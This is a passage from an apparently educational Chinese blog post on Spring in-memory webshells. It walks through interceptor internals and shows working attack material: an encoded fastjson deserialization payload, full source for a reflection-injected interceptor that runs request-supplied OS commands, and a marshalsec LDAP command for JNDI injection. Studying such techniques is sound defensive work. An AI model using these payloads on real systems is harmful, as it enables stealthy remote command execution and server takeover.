YWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDAAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAEAClNvdXJjZUZpbGUBAApwb2NfMS5qYXZhDAA6ADsHAMEMAMIAwwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAxAwAxQDGAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDADHAMgBAAVwb2NfMQEAD2phdmEvbGFuZy9DbGFzcwwAyQDKAQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAYvc2hlbGwMADoAegEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwAOgDLAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAOgDMAQADeHh4DAA6AFEMAM0AzgEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAM8A0AwA0QDSBwC+DADTANQHAL0MANUA1gEAAAEAB29zLm5hbWUHANcMANgA1gwA2QDaAQADd2luDADbANwBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwA3QDeBwDfDADgAOEMADoA4gEAA1xcQQwA4wDkDADlAOYMAOcA2gwA6AA7BwC&#x2F;DADpAFEMAOoAOwEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOsA7AEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAAgAOQAAAAAABgABADoAOwACADwAAAEFAAkACAAAAHEqtwABuAACEgMDuQAEAwDAAAVMKxIGuQAHAgDAAAZNEggSCQO9AAq2AAtOuwAMWQS9AA1ZAxIOU7cADzoEuwAQWQO9ABG3ABI6BbsAE1kZBBkFAQEBAQG3ABQ6BrsACFkSFbcAFjoHLBkGGQcttgAXsQAAAAIAPQAAACoACgAAABYABAAYABMAGQAfABoAKwAbAD0AHABKAB0AXAAeAGcAHwBwACAAPgAAAFIACAAAAHEAPwBAAAAAEwBeAEEAQgABAB8AUgBDAEQAAgArAEYARQBGAAMAPQA0AEcASAAEAEoAJwBJAEoABQBcABUASwBMAAYAZwAKAE0AQAAHAE4AAAAGAAIATwBQAAEAOgBRAAIAPAAAAD0AAQACAAAABSq3AAGxAAAAAgA9AAAACgACAAAAIgAEACQAPgAAABYAAgAAAAUAPwBAAAAAAAAFAFIAUwABAFQAAAAFAQBSAAAAAQBVADsAAgA8AAAB4QAGAAgAAADGuAACwAAYwAAYtgAZTLgAAsAAGMAAGLYAGk0suQAbAQBOKxIcuQAdAgA6BBIeOgUSH7gAILYAIRIitgAjmQAiuwAkWQa9AA1ZAxIlU1kEEiZTWQUZBFO3ACc6BqcAH7sAJFkGvQANWQMSKFNZBBIpU1kFGQRTtwAnOga7ACpZGQa2ACu2ACy3AC0SLrYALzoHGQe2ADCZAAsZB7YAMacABRkFOgUZB7YAMi0ZBbYAMy22ADQttgA1pwAOOgUsEQGUuQA3AgCxAAEAKwC3ALoANgADAD0AAABKABIAAAAnAA0AKAAaACkAIQAqACsALAAvAC4APwAvAF4AMQB6ADMAkAA0AKQANQCpADYArwA3ALMAOAC3ADsAugA5ALwAOgDFADwAPgAAAGYACgBbAAMAVgBXAAYALwCIAFgAUwAFAHoAPQBWAFcABgCQACcAWQBaAAcAvAAJAFsAXAAFAAAAxgA&#x2F;AEAAAAANALkAXQBeAAEAGgCsAF8AYAACACEApQBhAGIAAwArAJsAYwBTAAQAZAAAAEUABv8AXgAGBwBlBwBmBwBnBwBoBwBpBwBpAAD8ABsHAGr8ACUHAGtBBwBp&#x2F;wAXAAUHAGUHAGYHAGcHAGgHAGkAAQcAbAoATgAAAAQAAQA2AAEAbQBuAAMAPAAAAD8AAAADAAAAAbEAAAACAD0AAAAGAAEAAABAAD4AAAAgAAMAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAcQByAAIATgAAAAQAAQBzAFQAAAAJAgBvAAAAcQAAAAEAbQB0AAMAPAAAAEkAAAAEAAAAAbEAAAACAD0AAAAGAAEAAABEAD4AAAAqAAQAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAdQB2AAIAAAABAHcAeAADAE4AAAAEAAEAcwBUAAAADQMAbwAAAHUAAAB3AAAACQB5AHoAAwA8AAAAQQACAAIAAAAJuwAIWbcAOEyxAAAAAgA9AAAACgACAAAARwAIAEgAPgAAABYAAgAAAAkAewB8AAAACAABAH0AQAABAE4AAAAEAAEANgBUAAAABQEAewAAAAEAfgAAAAIAfw&#x3D;&#x3D;&quot;],&#39;_name&#39;:&#39;c.c&#39;,&#39;_tfactory&#39;:&#123;&#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>OK！</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220609030458812.png\" alt=\"image-20220609030458812\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.cnblogs.com/zpchcbd/p/15544419.html\">SpringBoot Controller 内存马 / yso定制 - zpchcbd</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/198886#h3-12\">基于内存 Webshell 的无文件攻击技术研究</a></p>\n<p><a href=\"https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#\">Spring 内存马实现 | MYZXCG</a></p>\n<h2 id=\"Spring-Interceptor-内存马\"><a href=\"#Spring-Interceptor-内存马\" class=\"headerlink\" title=\"Spring Interceptor 内存马\"></a>Spring Interceptor 内存马</h2><p>随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关，复杂均衡，防火墙。所以如果你新建的shell路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃，所以这里学习一种 Intercepor 指Spring中的拦截器，主要用于拦截用户请求并作相应处理，比如判断用户登录状态，日志记录，权限管理等</p>\n<h3 id=\"流程分析-1\"><a href=\"#流程分析-1\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h3><p>自定义拦截器必须实现 <strong>HandlerInterceptor</strong> 接口，HandlerInterceptor接口中有三个方法：</p>\n<ol>\n<li>preHandle方法是controller方法执行前拦截的方法<ul>\n<li>可以使用request或者response跳转到指定的页面</li>\n<li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li>\n<li>return false不放行，不会执行controller中的方法。</li>\n</ul>\n</li>\n<li>postHandle是controller方法执行后执行的方法，在JSP视图执行前。<ul>\n<li>可以使用request或者response跳转到指定的页面</li>\n<li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li>\n</ul>\n</li>\n<li>afterCompletion方法是在JSP执行后执行<ul>\n<li>request或者response不能再跳转页面了</li>\n</ul>\n</li>\n</ol>\n<p>一、创建自定义拦截器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.interceptor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InterceptorConfig</span> <span class=\"keyword\">implements</span> <span class=\"title\">HandlerInterceptor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;preHandle()&quot;</span>);</span><br><span class=\"line\">        response.setContentType(<span class=\"string\">&quot;text/html&quot;</span>);</span><br><span class=\"line\">        response.getOutputStream().print(<span class=\"string\">&quot;[+] preHandle()&lt;br&gt;&quot;</span>);</span><br><span class=\"line\">        response.flushBuffer();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">postHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]postHandle&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afterCompletion</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]afterCompletion&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>二、配置注册启用 Interceptor</p>\n<p>创建一个实现了 WebMvcConfigurer 接口的配置类（使用了 @Configuration 注解的类），重写 addInterceptors() 方法，并在该方法中调用 registry.addInterceptor() 方法将自定义的拦截器注册到容器中。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.interceptor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.context.annotation.Configuration;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InterceptorConfig</span>  <span class=\"keyword\">implements</span> <span class=\"title\">WebMvcConfigurer</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">addInterceptors</span><span class=\"params\">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class=\"line\">        registry.addInterceptor(<span class=\"keyword\">new</span> TestInterceptor()).addPathPatterns(<span class=\"string\">&quot;/inter&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>三、对应配置类中对应的path的controller</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/inter&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[controller] inter&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;[controller] this is inter&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220610225431061.png\" alt=\"image-20220610225431061\"></p>\n<p>Spring MVC会使用 DispatcherServlet 中的 <strong>doDispatch</strong> 方法进行请求的处理：详细的SpringMVC请求过程：<a href=\"https://blog.csdn.net/icarusliu/article/details/78809790\">SpringMVC源码分析</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220610230737065.png\" alt=\"image-20220610230737065\"></p>\n<p>首先会通过 <strong>getHandler()</strong> 获取当前请求的 handler</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220610231516927.png\" alt=\"image-20220610231516927\"></p>\n<p>跟进，遍历  <strong>this.handlerMappings</strong> 属性后获取处理本次请求的 HandlerMapping 对应就是 mapping，然后调用<strong>mapping 的 getHandler 方法</strong>  来处理这次请求</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220611231736428.png\" alt=\"image-20220611231736428\"></p>\n<p>跟踪后走到 <strong>org.springframework.web.servlet.handler.AbstractHandlerMapping 中的 getHandler</strong>，这个方法主要就是两件事，一、通过 <strong>getHandlerInternal</strong> 获取Handler(此时handler为对应路径下的controller方法)。二、通过 <strong>getHandlerExecutionChain</strong> 获取生效的各个拦截器并组装成HandlerExecutionChain并返回</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220611232538883.png\" alt=\"image-20220611232538883\"></p>\n<p>跟进 <strong>getHandlerExecutionChain</strong> ，首先实例化一个 <strong>HandlerExecutionChain对象</strong>，遍历 <strong>adaptedInterceptors</strong> 属性，然后判断是不是 <strong>MappedInterceptor</strong> 类型的实例，通过判断后去通过URL请求路径匹配，与拦截器中的路径相匹配，就将拦截器添加到chain中</p>\n<blockquote>\n<p>关于 adaptedInterceptors 的初始化见：<a href=\"https://blog.csdn.net/icarusliu/article/details/78833520\">Spring Boot拦截器示例及源码原理分析</a>  中的 2</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220611234625958.png\" alt=\"image-20220611234625958\"></p>\n<p>然后将这个chain和handler一路返回到 <strong>doDispatch</strong> 中 调用 <strong>applyPreHandle</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612000026649.png\" alt=\"image-20220612000026649\"></p>\n<p>循环调用拦截器的preHandle方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612000529098.png\" alt=\"image-20220612000529098\"></p>\n<p>所以走到了我们自定义的拦截器中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612000618470.png\" alt=\"image-20220612000618470\"></p>\n<h3 id=\"实现-1\"><a href=\"#实现-1\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>思路</p>\n<ul>\n<li>创建一个恶意 Interceptor，实现其恶意preHandle方法</li>\n<li>通过容器获取上下文，然后获取 RequestMappingHandlerMapping</li>\n<li>获取adaptedInterceptors字段，然后添加恶意interceptor</li>\n</ul>\n<h3 id=\"出网情况-1\"><a href=\"#出网情况-1\" class=\"headerlink\" title=\"出网情况\"></a>出网情况</h3><p>ShellInterceptor.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title\">HandlerInterceptor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping abstractHandlerMapping  = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取adaptedInterceptors属性</span></span><br><span class=\"line\">        java.lang.reflect.Field field = AbstractHandlerMapping.class.getDeclaredField(<span class=\"string\">&quot;adaptedInterceptors&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 避免重复添加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = adaptedInterceptors.size() - <span class=\"number\">1</span>; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adaptedInterceptors.get(i) <span class=\"keyword\">instanceof</span> ShellInterceptor) &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;已添加过&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ShellInterceptor shellInterceptor = <span class=\"keyword\">new</span> ShellInterceptor(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        adaptedInterceptors.add(shellInterceptor);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String code = request.getParameter(<span class=\"string\">&quot;code&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(code != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                java.io.PrintWriter writer = response.getWriter();</span><br><span class=\"line\">                String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                ProcessBuilder p;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>))&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                java.util.Scanner c = <span class=\"keyword\">new</span> java.util.Scanner(p.start().getInputStream()).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>);</span><br><span class=\"line\">                o = c.hasNext() ? c.next(): o;</span><br><span class=\"line\">                c.close();</span><br><span class=\"line\">                writer.write(o);</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">                writer.close();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为class文件后，利用marashalsec起一个ldap，将恶意class文件所在目录利用python起一个http-server</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;#ShellInterceptor</span><br></pre></td></tr></table></figure>\n\n<p>fastjson触发jndi注入</p>\n<figure class=\"highlight 